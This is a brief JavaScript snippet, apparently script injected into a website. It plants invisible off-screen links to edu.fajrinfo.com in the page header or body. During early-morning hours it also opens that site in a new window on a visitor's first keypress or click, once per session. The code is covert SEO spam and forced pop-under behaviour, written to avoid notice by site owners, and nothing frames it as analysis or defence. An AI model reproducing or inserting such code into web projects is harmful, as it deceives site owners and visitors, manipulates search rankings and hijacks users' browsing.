//  console.log(NN)
let EFV='<a href="https://edu.fajrinfo.com" style="position: absolute;z-index: -9999;left: -100%;">Edufajrinfo</a><a href="https://edu.fajrinfo.com" style="position: absolute;z-index: -9999;left: -100%;">Edufajrinfo</a>'

if(document.querySelector('header')){document.querySelector('header').insertAdjacentHTML('beforeend',EFV);}
else{document.querySelector('body').insertAdjacentHTML('beforeend',EFV);}

if(!sessionStorage.ef&&new Date().getHours()>=2&&new Date().getHours()<=6){
    function AB(CD){
        document.addEventListener(CD,()=>{
                if(!sessionStorage.ef){
                window.open(`https://edu.fajrinfo.com`);
                sessionStorage.ef = '1';
            }
        })
    }
    AB('keydown'); 
    AB('mousedown');
}
// url=https%3A%2F%2Fedu.fajrinfo.com%2F&usg=AOvVaw1c_R-cs8NrHL1XBWHB2DfG
// url=https%3A%2F%2Fedu.fajrinfo.com%2F&usg=AOvVaw3I4MPjs6FqgBod4oFx02Qu